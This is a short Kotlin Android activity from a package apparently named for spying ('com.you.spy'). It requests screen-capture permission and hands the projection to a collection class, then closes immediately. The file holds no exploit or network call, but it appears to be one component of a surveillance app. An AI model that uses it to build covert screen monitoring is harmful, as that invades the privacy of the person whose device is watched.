package com.you.spy.ui

import android.app.Activity
import android.content.Context
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import com.you.spy.collect.Capture

class ScreenCaptureActivity : Activity() {

    private val req = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mgr.createScreenCaptureIntent(), req)
    }

    override fun onActivityResult(code: Int, resultCode: Int, data: android.content.Intent?) {
        if (code == req && resultCode == RESULT_OK && data != null) {
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            runCatching { Capture.setProjection(mgr.getMediaProjection(resultCode, data)) }
        }
        finish()
    }
}
